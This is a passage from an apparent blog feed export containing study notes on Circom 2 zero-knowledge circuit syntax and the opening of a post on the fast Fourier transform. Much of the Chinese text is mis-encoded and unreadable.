&quot;\&quot;==\&quot;&quot;, &quot;\&quot;===\&quot;&quot;, &quot;\&quot;==&gt;\&quot;&quot;, &quot;\&quot;&gt;\&quot;&quot;, &quot;\&quot;&gt;=\&quot;&quot;, &quot;\&quot;&gt;&gt;\&quot;&quot;, &quot;\&quot;?\&quot;&quot;, &quot;\&quot;\\\\\&quot;&quot;, &quot;\&quot;]\&quot;&quot;, &quot;\&quot;^\&quot;&quot;, &quot;\&quot;|\&quot;&quot;, &quot;\&quot;||\&quot;&quot;] &#125;</span><br><span class="line">   â”Œâ”€ &quot;main.circom&quot;:28:1</span><br></pre></td></tr></table></figure><p>Note: the private input signal should be declared as<code>signal input</code>.</p><h2 id="template-and-component">template and component</h2><p>template is more like the declaration, and component is more like theinitiation.</p><p>The input signal of a template allows us to connect a wire into thesubcomponent of the whole subcircuit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pragma circom 2.1.4;</span><br><span class="line"></span><br><span class="line">template Num2Bits (nBits) &#123;</span><br><span class="line">    signal input in;</span><br><span class="line">    signal output b[nBits];</span><br><span class="line"></span><br><span class="line">    for(var i = 0; i &lt; nBits; i++)&#123;</span><br><span class="line">        //  b[i] &lt;-- (in \ 2 ** i) % 2;</span><br><span class="line">        b[i] &lt;-- (in &gt;&gt; i) &amp; 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    var sum = 0;</span><br><span class="line">    for(var i = 0; i &lt; nBits; i++)&#123;</span><br><span class="line">        sum += (2**i) * b[i];</span><br><span class="line">    &#125;</span><br><span class="line">    in === sum;</span><br><span class="line">    for(var i = 0; i &lt; nBits; i++)&#123;</span><br><span class="line">        0 === b[i] * (b[i] - 1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">template Main()&#123;</span><br><span class="line">    signal input in;</span><br><span class="line">    signal output thirdBit;</span><br><span class="line">    component bitfier = Num2Bits(5);</span><br><span class="line">    bitfier.in &lt;== in;</span><br><span class="line">    thirdBit &lt;== bitfier.b[3] + 3; // the index of b is from 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">component main = Main();</span><br><span class="line">// note: b array is from b0 to b(n-1), the left bit is the least significant bit</span><br><span class="line">/* INPUT = &#123;</span><br><span class="line">    &quot;in&quot;: &quot;11&quot;</span><br><span class="line">&#125; */</span><br></pre></td></tr></table></figure><p>Poseidon hash function is a snark friendly hash, which is composed ofa bunch of pluses and times operations.</p>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
        <tags>
            
            <tag> circom </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Circom 2 è¯­æ³•ä¸æ³¨æ„ç‚¹</title>
      <link href="/blog/2023/03/26/crypto/zk/7.circom_grammar/"/>
      <url>/blog/2023/03/26/crypto/zk/7.circom_grammar/</url>
      
        <content type="html"><![CDATA[<h1 id="circom-2-è¯­æ³•">Circom 2 è¯­æ³•</h1><p>Recommend you go through the documentation of the circom for possiblelook-up later.</p><p>ä» circom çš„ç¼–è¯‘è¿‡ç¨‹æ¥çœ‹ï¼Œcircomå®é™…ä¸Šæ˜¯ä¸€ä¸ªçº¦æŸè¯­è¨€ï¼Œå®ƒæœ€ç»ˆç¼–è¯‘æˆå¤šé¡¹å¼çº¦æŸã€‚ç›¸å½“äºäººä¸å¤šé¡¹å¼çº¦æŸï¼Œä¾‹å¦‚R1CS ä¹‹é—´çš„ä¸€ä¸ªæ¡¥æ¢ã€‚</p><ol type="1"><li><p>circomlib introduction</p><p>circomlib contains a listing of audited, common circuit buildingblocks. You can find many of the circuits weâ€™re discussing today in thislibrary.</p><p>All signals in the circom are field elements in the prime field oforder:<code>r = 21888242871839275222246405745257275088548364400416034343698204186575808495617</code>This is a 254-bit prime known as the <strong>BabyJubJub prime</strong>.Itâ€™s the curve order for BN254, a pairing-friendly elliptic curve usedby Ethereum and (formerly) ZCash. You can read more about BN254 inJonathan Wangâ€™s excellent document <ahref="https://hackmd.io/@jpw/bn254">here</a>.</p><p>Compared with general programming language, such as C++, circom as aDSL (Domain-specific language) can ensure constraint which is necessaryfor zkp, These constraints usually involve restrictions on data typesand logical relationships, such as the need to avoid using types such asfloating-point numbers, and the need to ensure that the circuit isbinary pluggable</p><p>Real-world application of circom: tornado cash, Dark forest,Semaphore</p></li><li><p>circom ä¸ snarkjs</p><p>circom å’Œ circomlib åº“éƒ½æ˜¯ JavaScriptè¯­è¨€çš„å‰ç«¯ï¼Œä»–ä»¬å¯ä»¥æ”¯æŒå¤šä¸ªåç«¯ï¼Œä¹Ÿå°±æ˜¯çœŸæ­£çš„è¯æ˜ç³»ç»Ÿ proving system.è¿™ä¸¤ä¸ªåº“éƒ½æ˜¯è¿æ¥çš„ snarkjs proving system using BN254 curve. snarkjs isa JavaScript and Pure Web Assembly implementation of zkSNARK and PLONKschemes. It uses the Groth16 Protocol (3 point only and 3 pairings),PLONK and FFLONK. æ”¯æŒ Groth16ï¼Œ PLONK.</p><p>popular proving system implementation: Circom(snarkjs),ZoKrates(libsnark, bellman) To combine machine learning with circuit,For python, a not-mature library: <ahref="%5BPySNARK%20%7C%20Library%20for%20programming%20SNARKs%20directly%20in%20Python%5D(https://meilof.github.io/pysnark/)">PySNARK(snarkjs,libsnark)</a></p><p>For javascript API about Pytorch, <ahref="https://towardsdatascience.com/onnx-js-universal-deep-learning-models-in-the-browser-fbd268c67513">ONNX.js:Universal Deep Learning Models in The Browser | by Will Badr | TowardsData Science</a></p></li><li><p>datatype date type in the circom:</p><ol type="1"><li><p>Field element value, integer values modulo the prime number p.The size is in the range of [0, p-1], which may be implemented by bigint library in javascript.</p></li><li><p>array with the same type (signal, var, or the same type ofcomponents or arrays again).</p></li></ol></li><li><p>circom åªæ¥å— åŠ å·å’Œä¹˜å·ï¼Œå¯ä»¥æ¥å—çš„å½¢å¼å¦‚ä¸‹ï¼š</p><p>a = b + c, a = b * c, a = b(b-1)+b Any equations with degree two orless can be accepted. The compiler will figure out how to break it downinto a sequence of equations that are admitted by a particularconstraint system we are working with.</p><p>We can write linear equations and quadratic equations that dont havemore one quadratic term.</p></li><li><p>zkrepl syntax sugar: json comment input</p></li><li><p>ä½¿ç”¨ä¸‰ç­‰å·æ¥å†™çº¦æŸ</p></li><li><p>circom çº¦æŸçš„æ“ä½œç¬¦åªæœ‰åŠ æ³•å’Œä¹˜æ³•ï¼Œå¯ä»¥å†™çº¿æ€§æ–¹ç¨‹ç»„æˆ–è€…åªæœ‰ä¸€ä¸ªäºŒæ¬¡é¡¹çš„äºŒæ¬¡æ–¹ç¨‹ã€‚ å…³äº constraintçš„é™åˆ¶å¯ä»¥çœ‹å®˜æ–¹æ–‡æ¡£ <ahref="https://docs.circom.io/circom-language/constraint-generation/">ConstraintGeneration - Circom 2 Documentation</a>. å®˜æ–¹æ–‡æ¡£é˜è¿°äº† circomçš„å…·ä½“è¯­æ³•ç»†èŠ‚å¯ä»¥åœ¨ç¼–ç¨‹æ—¶å¤šçœ‹çœ‹ã€‚</p></li><li><p><code>&lt;--</code> æ“ä½œç¬¦æ˜¯ derive ä¸­é—´å˜é‡ç”¨çš„ï¼Œå¯ä»¥ç”¨javascript çš„ä»»æ„è¿ç®—ç¬¦ï¼Œä¸å±€é™äºåŠ æ³•å’Œä¹˜æ³•ã€‚</p><p>syntax surgar: <code>&lt;==</code> is equal to constraint<code>&lt;--</code> and witness assignment <code>===</code></p><p>åªæœ‰ <code>&lt;==</code> å’Œ <code>===</code>æ‰ä¼šè¢«ç¼–è¯‘åˆ°æœ€åçš„çº¦æŸç³»ç»Ÿé‡Œï¼Œ<code>&lt;--</code> æ“ä½œç¬¦æ˜¯å°†ç¬¦å·è¾“å…¥proving machine ä¹‹å‰äººå·¥è®¡ç®—çš„è¾“å…¥ï¼Œåªæ˜¯è¿™é‡Œç”¨ä»£ç ä»£æ›¿äº†è€Œå·²ã€‚ä¸€ä¸ªå¯¹æ¯”æ˜¯ï¼š<code>&lt;--</code> ç¬¦å·è®¡ç®—çš„ç»“æœé”™è¯¯çš„è¯ï¼ŒCircom ä¼šæ˜¾ç¤ºcircom safe ä»¥åŠ <strong>assert fail mode</strong> æç¤ºä¸æ»¡çº¦æŸï¼Œè€Œçº¦æŸç­‰å¼é”™è¯¯æ•´ä¸ªæ„è¶³æ€å°±å˜äº†ã€‚</p><p><code>&lt;--</code> å’Œä¸€äº›å…¶ä»–çš„è®¡ç®—ï¼Œæ˜¯ä¸ºäº†æ–¹ä¾¿æ ¹æ® input ç”Ÿæˆ proveç”¨çš„ï¼Œå³ä½¿æ²¡æœ‰è¿™äº›è®¡ç®—ï¼Œprover æ‰‹åŠ¨ç®—å‡ºæ¥æ”¾åˆ°æœ€å proving è¿‡ç¨‹é‡Œä¹Ÿå¯ä»¥ã€‚åªæœ‰éœ€è¦çº¦æŸçš„ç­‰å¼æ‰åªèƒ½ç”¨ ä¹˜æ³•å’ŒåŠ æ³•ã€‚ä¹‹å‰çš„é”™è¯¯ç­”æ¡ˆé‡Œçš„è®¡ç®—å’Œèµ‹å€¼ï¼Œåªæ˜¯å®ç°äº† â€œprover ä¸ä½œæ¶æƒ…å†µä¸‹å¦‚ä½•æ ¹æ®input è®¡ç®—å‡ºæ­£ç¡®çš„å€¼â€ï¼Œå¹¶ä¸èƒ½é˜²æ­¢ â€œæ¶æ„çš„ prover ç”¨é”™è¯¯å€¼é€šè¿‡ verifyâ€ï¼Œå› ä¸ºè¿™äº›æ²¡æœ‰è¿›å…¥æœ€åçš„çº¦æŸé‡Œã€‚</p><p>æ³¨æ„ï¼šsignal output <code>vari</code> ä¸­çš„ derived signal<code>vari</code> æ—¶ derived å‡ºæ¥çš„å…¬å¼€å˜é‡ï¼Œä¸éœ€è¦åœ¨ zkrepl çš„ inputä¸­æŒ‡å®šå€¼ã€‚ æ³¨æ„ï¼š"&lt;=="çš„å†™æ³•åªé€‚ç”¨äºç”Ÿæˆçš„æ—¶å€™ä¹ŸåªåŒ…å«åŠ å·å’Œä¹˜å·çš„ä¸­é—´å˜é‡ï¼Œå¦‚æœç”Ÿæˆä¸­é—´å˜é‡çš„æ—¶å€™éœ€è¦åŠ å’Œä¹˜ä¹‹å¤–çš„æ“ä½œï¼Œé‚£å°±éœ€è¦åˆ†å¼€å†™æˆ<code>&lt;--</code> å’Œ <code>===</code> çš„æ ·å­äº†ã€‚</p></li><li><p>range check, check 0 &lt;= in =&lt; 15,</p><p>é€šè¿‡å°†å…¶çº¦æŸä¸ºå››ä¸ª 0/1 æ¯”ç‰¹çš„è¡¨è¾¾å½¢å¼ï¼Œä¹Ÿå°±æ˜¯ num2bit</p></li><li><p>array</p></li><li><p>for loop</p></li><li><p>private and public</p><table><colgroup><col style="width: 17%" /><col style="width: 17%" /><col style="width: 65%" /></colgroup><thead><tr class="header"><th>variable</th><th>private</th><th>public</th></tr></thead><tbody><tr class="odd"><td>signal</td><td><code>signal input</code></td><td><code>signal input</code> and specify in<code>main &#123; public [ b ]&#125;</code></td></tr><tr class="even"><td>derived signal</td><td><code>signal</code></td><td><code>signal output</code></td></tr></tbody></table><ol type="1"><li><code>signal x</code> x is a intermediate value auto-generated bycircom2 at proving timeï¼Œ default private</li><li><code>component main &#123; public [ b ]&#125; = Num2Bits(4);</code> b æ˜¯public <strong>input</strong> signals for verifier, b can be an array,where the form of input in zkrepl should be<code>"b": ["1", "2", "3","3"]</code>.</li><li><code>signal output b[nBits];</code> output keyword is used tospecify the derived signal that is made public while it's defined, whichis an output of some computation that you want to reveal to theverifier.</li></ol><p>if you have defined the variable as <code>signal output</code>, itbecomes a public output signal, and there is no need to add it in the<code>component main &#123; public [ b ]&#125; = Num2Bits(4);</code>. The publicin the main is accompanied by the <code>signal</code> input`.</p><p>the private and public keywords are the circom language features.zkSNARK machinery cannot tell which is public or private.</p><blockquote><p>from the programmer's point of view, only public input and outputsignals are visible from outside the circuit, and hence no intermediatesignal can be accessed.</p></blockquote></li><li><p>witness refers to the set of all signals that are passed into theprover.</p></li><li><p><code>var</code> ä¸ <code>signal</code> çš„åŒºåˆ«</p><ol type="1"><li><p><code>var</code> is mutable for convenience, however, signal isimmutable.</p></li><li><p>circom ä¸­ <code>var</code> is intermediate variables,<code>signal input</code> variables are given by the user. Thus, onlythe input variables are at the risk of being forged when the constraintsare not done well. ref:<ahref="https://github.com/Antalpha-Labs/zkp-co-learn/discussions/43">ã€session2ã€‘åœ¨äº†è§£äº†çº¦æŸåï¼Œå¯¹äº Num2Bits ç”µè·¯çªç„¶äº§ç”Ÿäº†ç–‘æƒ‘ Â·Antalpha-Labs/zkp-co-learn Â· Discussion #43</a></p></li><li><p>The <code>var</code> variable hold either numerical values of thefield or <strong>arithmetic expressions when they are used to buildconstraints (see Constraint Generation)</strong>. They can be namedusing a variable identifier or can be stored in arrays.</p><p>When the <code>var</code> variable is assigned as an arithmeticexpression, it can be seen as a placeholder for you to write the circuitconveniently. In the end, the <code>var</code> variable will be replacedor expanded in the arithmetic expression, which should meet therequirement in Constraint Generation.</p><p>ref: <ahref="https://github.com/Antalpha-Labs/zkp-co-learn/discussions/45">varå’Œ signal ä¹‹é—´çš„å·®å¼‚ï¼Ÿ Â· Antalpha-Labs/zkp-co-learn Â· Discussion #45</a><ahref="https://docs.circom.io/circom-language/variables-and-mutability/">Variables&amp; Mutability - Circom 2 Documentation</a></p></li></ol></li><li><p>TODOï¼š Why there are <code>IsEqual</code> and <code>IsZero</code>function exist? the three equal <code>===</code> funciton can check theequality.</p></li></ol><h2id="zk-resources-for-ml-specialists">ZK-resources-for-ML-specialists</h2><p><ahref="https://0xparc.notion.site/public-ZK-resources-for-ML-specialists-70770f20778446d596aa340c2f47d4b2">ModernZK Crypto - Session 2 Lecture Notes - HackMD</a></p><h2 id="references">References</h2><ol type="1"><li><a href="https://hackmd.io/@gubsheep/Hyx1hho5o">Modern ZK Crypto -Session 2 Lecture Notes - HackMD</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
        <tags>
            
            <tag> circom </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¿«é€Ÿå‚…é‡Œå¶å˜æ¢</title>
      <link href="/blog/2023/03/25/crypto/math/7.fft/"/>
      <url>/blog/2023/03/25/crypto/math/7.fft/</url>
      
        <content type="html"><![CDATA[<h1 id="å¿«é€Ÿå‚…é‡Œå¶å˜æ¢">å¿«é€Ÿå‚…é‡Œå¶å˜æ¢</h1><h2id="å‚…é‡Œå¶å˜æ¢ç¦»æ•£å‚…é‡Œå¶å˜æ¢ä¸å¿«é€Ÿå‚…é‡Œå¶å˜æ¢">å‚…é‡Œå¶å˜æ¢ã€ç¦»æ•£å‚…é‡Œå¶å˜æ¢ä¸å¿«é€Ÿå‚…é‡Œå¶å˜æ¢</h2><blockquote><p>The Fourier Transform is a tool that breaks a waveform (a function orsignal) into an alternate representation, characterized by the<strong>sine and cosine functions </strong>of varying<strong>frequencies</strong>. The Fourier Transform shows that anywaveform can be re-written as the sum of sinusoidals.</p></blockquote><p>å‚…é‡Œå¶å˜æ¢(Fouriertransformï¼ŒFT)å°†å‡½æ•°(åœ¨åº”ç”¨ä¸Šç§°ï¼šä¿¡å·ï¼Œæ³¢å½¢ï¼‰åˆ†è§£ä¸ºä¸åŒç‰¹å¾çš„æ­£å¼¦å‡½æ•°çš„å’Œï¼Œä»è€Œå°†å…¶ç”±æ—¶åŸŸè½¬æ¢åˆ°é¢‘åŸŸã€‚é€†å‚…é‡Œå¶å˜æ¢åˆ™åå‘æ“ä½œï¼Œå› å…¶åŸºæœ¬æ€æƒ³é¦–å…ˆç”±æ³•å›½å­¦è€…çº¦ç‘Ÿå¤«Â·å‚…é‡Œå¶ç³»ç»Ÿåœ°æå‡ºï¼Œæ‰€ä»¥ä»¥å…¶åå­—æ¥å‘½åä»¥ç¤ºçºªå¿µã€‚</p><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œè‹¥â€œå‚…é‡Œå¶å˜æ¢â€ä¸€è¯ä¸åŠ ä»»ä½•é™å®šè¯­ï¼Œåˆ™æŒ‡çš„æ˜¯â€œè¿ç»­å‚…é‡Œå¶å˜æ¢â€ï¼ˆè¿ç»­å‡½æ•°çš„å‚…é‡Œå¶å˜æ¢ï¼‰ã€‚åœ¨å·¥ç¨‹åº”ç”¨ä¸­ï¼Œå¾—ç›Šäºæ•°å­—æŠ€æœ¯çš„åº”ç”¨ï¼Œç»å¤§å¤šæ•°å‚…é‡Œå¶å˜æ¢çš„åº”ç”¨éƒ½æ˜¯é‡‡ç”¨ç¦»æ•£å‚…é‡Œå¶å˜æ¢ï¼ˆDFTï¼‰ï¼Œæ›´ç¡®åˆ‡çš„è¯´ï¼Œæ˜¯å®ƒçš„å¿«é€Ÿç®—æ³•å¿«é€Ÿå‚…é‡Œå¶å˜æ¢ï¼ˆFFTï¼ŒFastFourier Transform)ã€‚ç¦»æ•£å‚…é‡Œå¶å˜æ¢å°±æ˜¯å¯¹è¿ç»­å‚…é‡Œå¶å˜æ¢ç¦»æ•£åŒ–,ç­‰ä»·äºå¯¹ä¿¡å·è¿›è¡Œé‡‡æ ·ï¼Œå°†å…¶å˜ä¸ºæœ‰é™åºåˆ—çš„å‚…é‡Œå¶å˜æ¢ã€‚</p><blockquote><p>The Discrete Fourier Transform (DFT) is the equivalent of thecontinuous Fourier Transform for signals known only at N instantsseparated by sample times T (i.e. a finite sequence of data) ^4</p></blockquote><p>å¿«é€Ÿå‚…é‡Œå¶å˜æ¢ï¼ˆFast Fourier Transformï¼ŒFFTï¼‰æ˜¯ä¸€ç§å¯åœ¨ O(nlogn)æ—¶é—´å†…å®Œæˆçš„ç¦»æ•£å‚…é‡Œå¶å˜æ¢ï¼ˆDiscrete Fourier transformï¼ŒDFTï¼‰ç®—æ³•ã€‚è€Œä»computer science çš„è§†è§’ï¼ŒFFT ä¸»è¦æ˜¯è¢«ç”¨æ¥å°† O(n^2)å¤æ‚åº¦å¤šé¡¹å¼ä¹˜æ³•åŠ é€Ÿä¸ºO(nlogn) ï¼Œä»è€Œå¿«é€Ÿè®¡ç®—å¤šé¡¹å¼ä¹˜æ³•ã€‚</p><h2 id="fft">FFT</h2><h3 id="naive-polynomial-multiplication">naive polynomialmultiplication</h3><p>è€ƒè™‘æœ´ç´ çš„å¤šé¡¹å¼ä¹˜ç§¯ç®—æ³•ï¼Œè€ƒè™‘åˆ°ä¸¤ä¸ªå¤šé¡¹å¼ A(x), B(x) çš„ä¹˜ç§¯C(x)ï¼Œå‡è®¾ A(x)çš„é¡¹æ•°ä¸º n, å…¶ç³»æ•°æ„æˆ n ç»´å‘é‡ <spanclass="math inline">\((a_0, a_1,\cdots,a_n)\)</span>ï¼ŒB(x) çš„é¡¹æ•°ä¸ºmï¼Œå¯¹åº” m ç»´å‘é‡ <span class="math inline">\((b_0,b_1,\cdots,b_m)\)</span>ã€‚åˆ™ C(x) çš„ç³»æ•°æ„æˆ n+m-1ç»´çš„å‘é‡ï¼Œå…¶ç®—æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">        c[i + j] += a[i] * b[j]</span><br></pre></td></tr></table></figure><p>å¤šé¡¹å¼ä¹˜æ³•æœ¬è´¨ä¸Šæ˜¯åŠ æ³•å·ç§¯ï¼Œè€Œ FFTå¯ä»¥åŠ é€Ÿå·ç§¯æ“ä½œã€‚å·ç§¯æ˜¯ä¿¡å·å¤„ç†é‡è¦æ“ä½œï¼Œå…¬å¼å¦‚ä¸‹ï¼š</p><p><span class="math display">\[(f*g)[k] = \sum_{i=\infty}^{\infty} f[k]g[k-i]\]</span></p><p>åˆ™å¤šé¡¹å¼ä¹˜æ³•å¯ä»¥è¡¨ç¤ºä¸ºä¸‹é¢å…¬å¼ã€‚ä¹Ÿå°±æ˜¯è¯´è¦è®¡ç®—å‡º C(x)çš„ <spanclass="math inline">\(x^k\)</span> é¡¹çš„ç³»æ•°ï¼Œéœ€è¦ A(x) çš„ <spanclass="math inline">\(x^i\)</span> é¡¹çš„ç³»æ•°å’Œ B(x)çš„ <spanclass="math inline">\(x^{k-i}\)</span> é¡¹çš„ç³»æ•°ä¹˜ç§¯ã€‚</p><p><span class="math display">\[C[k] = \sum_{k=\infty}^{\infty} A[k]B[k-i]\]</span></p><p>å¯¹åº”ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def bound(idx, arr): return arr[idx] if idx in range(len(arr)) else 0</span><br><span class="line">for k in range(len(a)+len(b)-1):</span><br><span class="line">    for i in range(k+1):</span><br><span class="line">        c[k] += bound(i, a) * bound(k-i, b)</span><br></pre></td></tr></table></figure><p>æ³¨æ„è¡¥ 0 æ“ä½œï¼šå¯¹äºç´¢å¼•è¶…å‡º [0,m] çš„ f(x) çš„å¤šé¡¹å¼ç³»æ•°ä»¥åŠç´¢å¼•è¶…å‡º[0ï¼Œn] çš„ g(x) å¤šé¡¹å¼ç³»æ•°è®¾ç½®ä¸º 0</p><p>ä¹Ÿå¯ä»¥å†™æˆï¼š<span class="math inline">\(C[k] = \sum_{i+j=k}A[i]B[j]\)</span></p><p>å½¢å¦‚ <span class="math inline">\(C[k] = \sum_{i \bigoplus j=k}A[i]B[j]\)</span> çš„å¼å­ç§°ä¸ºå·ç§¯ï¼Œå…¶ä¸­ <spanclass="math inline">\(\bigoplus\)</span> ä¸ºæŸç§è¿ç®—ã€‚</p><h3 id="polynomial-representations">polynomial representations</h3><p>å¯¹äº degree = n-1 å¤šé¡¹å¼ A(x)ï¼Œ</p><ol type="1"><li><p>Coefficient representation: æ‰€æœ‰é¡¹çš„ç³»æ•°ç»„æˆçš„ç³»æ•°å‘é‡<spanclass="math inline">\((a_0, a_1,a_2,...,a_{n-1})\)</span>å”¯ä¸€ç¡®å®šå¤šé¡¹å¼:<span class="math inline">\(A(x) =\sum_{i=0}^{n-1}a_ix^i\)</span></p></li><li><p>Point-value representation: ä¸€ç»„äº’ä¸ç›¸åŒçš„<spanclass="math inline">\((x_0, x_1,x_2, \cdots,x_{n})\)</span> ä»£å…¥A(x),å¾—åˆ° n ä¸ªå–å€¼ <span class="math inline">\((y_0,y_1, \cdots,y_n)\)</span>, å…¶ä¸­ <span class="math inline">\(y_i = \sum_{j=0}^{n}a_jx_i\)</span>ï¼Œå¯ä»¥é€šè¿‡æ‹‰æ ¼æœ—æ—¥æ’å€¼æ–¹æ³•å”¯ä¸€ç¡®å®šå¤šé¡¹å¼ã€‚</p></li></ol><p>å®šç†: ä¸€ä¸ª n-1 æ¬¡å¤šé¡¹å¼åœ¨ n ä¸ªä¸åŒç‚¹çš„å–å€¼å”¯ä¸€ç¡®å®šäº†è¯¥å¤šé¡¹å¼ã€‚</p><p>å·²çŸ¥ä¸€ç»„æ’å€¼ç‚¹ <span class="math inline">\((x_0, x_1,x_2,\cdots,x_{n})\)</span>ä¸­ A(x) ä¸ B(x)ï¼ˆå‡è®¾å¤šé¡¹å¼é˜¶æ•°ç›¸åŒï¼Œæ²¡æœ‰çš„è§†ä¸º0ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆè¡¥ 0 çš„åŸå› ï¼‰å¯¹åº”çš„ç‚¹å€¼å‘é‡åˆ†åˆ«ä¸º <spanclass="math inline">\((y_{a0},y_{a1}, \cdots, y_{an})\)</span> å’Œ <spanclass="math inline">\((y_{b0},y_{b1}, \cdots, y_{bn})\)</span>, åˆ™C(x)=A(x)B(x)çš„ç‚¹å€¼è¡¨è¾¾å¼å¯ä»¥åœ¨ O(n) çš„æ—¶é—´æ±‚å‡ºæ¥ï¼Œä¸º <spanclass="math inline">\((y_{a0}y_{b0},y_{a1}y_{b1}, \cdots,y_{an}y_{bn})\)</span>. å› ä¸º C(x) çš„é¡¹æ•°ä¸ºäºŒè€…ä¹‹å’Œï¼Œè€Œ A(x), B(x) åˆ†åˆ«æœ‰n,m é¡¹ï¼Œæ‰€ä»¥æˆ‘ä»¬ä»£å…¥çš„å·®å€¼èŠ‚ç‚¹è‡³å°‘æœ‰ n+m ä¸ªã€‚</p><p>åœ¨å¤šé¡¹å¼çš„ç‚¹å€¼è¡¨ç¤ºæ³•ä¸‹å¤šé¡¹å¼ä¹˜æ³•å¯ä»¥åœ¨ O(n)æ—¶é—´å†…æ±‚å‡ºï¼Œè¿œå¿«äºç³»æ•°è¡¨ç¤ºæ³•çš„O(n^2)æš´åŠ›å·ç§¯ã€‚ä½†æ˜¯å¦‚æœæŒ‰ç…§å®šä¹‰æ ¹æ®ç³»æ•°è¡¨ç¤ºæ±‚ä¸€ä¸ªå¤šé¡¹å¼çš„ç‚¹å€¼è¡¨ç¤ºï¼Œæ—¶é—´å¤æ‚åº¦ä¸ºO(n^2).å·²çŸ¥å¤šé¡¹å¼çš„ç‚¹å€¼è¡¨ç¤ºï¼Œæ±‚å…¶ç³»æ•°è¡¨ç¤ºï¼Œä½¿ç”¨æœ´ç´ çš„æ’å€¼ç®—æ³•æ—¶é—´å¤æ‚åº¦ä¸ºO(n^2)ã€‚ å› æ­¤ï¼ŒFFT é€šè¿‡ä»¥ä¸‹æ€è·¯ä¼˜åŒ–å¤šé¡¹å¼ä¹˜æ³•:</p><ol type="1"><li>polynomial multiplication under Point-value representation</li><li>choose root of unity to accelerate the convertion betweenPoint-value representation and class representation.</li></ol><p>å½“ç„¶ï¼Œå¦‚æœä»çŸ©é˜µè§’åº¦ç†è§£çš„è¯ï¼ŒFFT é€šè¿‡ä»¥ä¸‹æ€è·¯ä¼˜åŒ–å¤šé¡¹å¼ä¹˜æ³•: factorthe matrix of polynomial multiplication with the property of root ofunity. [^7]</p><h3 id="fft-1">FFT</h3><p>FFT ç®—æ³•æµç¨‹ï¼šæŠŠç³»æ•°è¡¨è¾¾è½¬æ¢ä¸ºç‚¹å€¼è¡¨è¾¾ -&gt; ç‚¹å€¼è¡¨è¾¾ç›¸ä¹˜-&gt;æŠŠç‚¹å€¼è¡¨è¾¾è½¬æ¢ä¸ºç³»æ•°è¡¨è¾¾ã€‚</p><p>â€œæŠŠç³»æ•°è¡¨è¾¾è½¬æ¢ä¸ºç‚¹å€¼è¡¨è¾¾â€çš„ç®—æ³•å«åš DFTï¼Œâ€œæŠŠç‚¹å€¼è¡¨è¾¾è½¬æ¢ä¸ºç³»æ•°è¡¨è¾¾â€çš„ç®—æ³•å«åš IDFT(DFT çš„é€†è¿ç®—)</p><p>å…¶å®æ’å€¼ç‚¹çš„é€‰æ‹©æ²¡æœ‰è§„å®šï¼Œåªè¦é€‰æ‹©çš„æ’å€¼ç‚¹ä¸åŒï¼Œä¸ªæ•°è¶³å¤Ÿå°±å¯ä»¥è¿›è¡ŒDFTã€‚ä½†æ˜¯äºŒè€…è½¬æ¢çš„å¤æ‚åº¦å°±æ˜¯ O(n^2)äº†ï¼Œå’Œå¤šé¡¹å¼ä¹˜æ³•ä¸€æ ·æ²¡æœ‰å¿…è¦ã€‚è€Œå‚…ç«‹å¶ï¼Œä¸€ä¸ªå¾ˆæ‡‚å¤æ•°çš„äººï¼ŒæŠŠé€‰æ‹©äº†å•ä½åœ†çš„å•ä½æ ¹root of unity ä»£å…¥äº†å¤šé¡¹å¼,æ±‚ç‚¹å€¼è¡¨è¾¾, åˆ©ç”¨å•ä½æ ¹çš„ç‰¹æ€§å°±å®ç°äº† O(nlogn)çš„æ•ˆç‡ã€‚</p><h3 id="å¤æ•°ä¸æ¬§æ‹‰å‡½æ•°">å¤æ•°ä¸æ¬§æ‹‰å‡½æ•°</h3><p>Euler's Formula on unit of circle: for any real x , <spanclass="math inline">\(e^{ix} =cosx+isinx\)</span>, where i is theimaginary unit, <span class="math inline">\(i^2= âˆ’1\)</span>.</p><p>æ ¹æ®å¤æ•°çš„çŸ¥è¯†ï¼Œå‘é‡çš„è®¡ç®—ï¼Œä¹˜é™¤æ³•æ¯”è¾ƒæ–¹ä¾¿ï¼Œç›´æ¥å°†ä¸¤ä¸ªç›¸é‡çš„æ¨¡ç›¸ä¹˜/é™¤ã€è¾è§’ç›¸åŠ /å‡å³å¯ï¼›è€ŒåŠ å‡æ³•å°±éœ€è¦åšåå¤çš„ç›´è§’åæ ‡-æåæ 